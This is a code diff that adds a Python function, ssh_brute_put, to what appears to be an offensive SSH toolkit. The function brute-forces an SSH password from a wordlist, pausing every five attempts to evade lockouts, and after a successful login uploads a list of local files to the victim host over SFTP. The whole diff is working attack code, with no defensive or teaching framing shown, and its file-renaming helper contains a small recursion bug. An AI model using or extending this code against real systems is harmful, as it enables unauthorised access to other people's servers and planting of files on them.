@@ -295,6 +295,92 @@ def ssh_brute_grab(ip, username, password_file, local_path, remote_path, sleep=F
     else:
         print(f"File: {password_file} Does not exist")
 
+def ssh_brute_put(ip, username, password_file, local_path, remote_path, sleep=False):
+    """
+    Bruteforcing an ssh connection with passwords from a file and uploads
+    files from directories provided from a file
+    """
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+    def is_copy(remote_file, remote_path):
+        """
+        If a file already exists on remote_path it will add _copy to the file
+        Note: if there already is a file_copy.txt i will become file_copy_copy.txt
+        """
+
+        for file in sftp.listdir_iter(remote_path):
+            if remote_file == file.filename:
+                file_name, file_extension = os.path.splitext(remote_file)
+                remote_file = f"{file_name}_copy{file_extension}"
+                is_copy(remote_file, remote_path)
+            else:
+                return remote_file
+        return remote_file
+
+    def put(local_path, remote_path):
+        if os.path.exists(local_path):
+            with open(local_path, 'r', encoding='UTF-8') as path_file:
+                local_path = path_file.read().splitlines()
+
+                for path in local_path:
+                    path = path.strip()
+                    if not path:
+                        continue
+                    try:
+                        remote_file = path.replace("\\","/").split("/")[-1] #file.txt
+                        remote_file = is_copy(remote_file, remote_path)
+                        remote_file_path = os.path.join(remote_path, remote_file) #/Path/to/file.txt
+                        sftp.put(path, remote_file_path)
+                        print(f'Uploaded {path} to {remote_file_path}')
+
+
+                    except IOError as e:
+                        print(f"Error: Could not upload {path}. Reason: {e}")
+        else:
+            print(f"Cannot find {local_path}")
+
+    if os.path.exists(password_file):
+        with open(password_file, 'r', encoding='UTF-8') as file:
+            passwords = file.read().splitlines()
+        print(f"Trying to bruteforce password on {ip} as {username}")
+
+        counter = 0
+        sleep_counter = 1
+        for password in passwords:
+            try:
+                print(f"Trying {username}-{password}")
+                ssh.connect(ip, username=username, password=password)
+                print('\n----------------------------')
+                print(f"Successful login with {username}-{password}")
+                print('----------------------------\n')
+
+                sftp = ssh.open_sftp()
+                put(local_path, remote_path)
+                sftp.close()
+                ssh.close()
+                break
+
+            except paramiko.AuthenticationException:
+                print(f"Failed with {username} - {password}")
+                print('----------------------------')
+
+            except Exception as e:
+                print(f"Error: {e}")
+                break
+            finally:
+                ssh.close()
+
+            if sleep:
+                counter +=1
+                if counter == 5:
+                    counter = 0
+                    sleep_amount(sleep_counter)
+                    if sleep_counter < 4:
+                        sleep_counter +=1
+    else:
+        print(f"File: {password_file} Does not exist")
+
 def ssh_commands(ip, user, password, commands):
     """
     Connect via ssh and then use commans submitted from a file
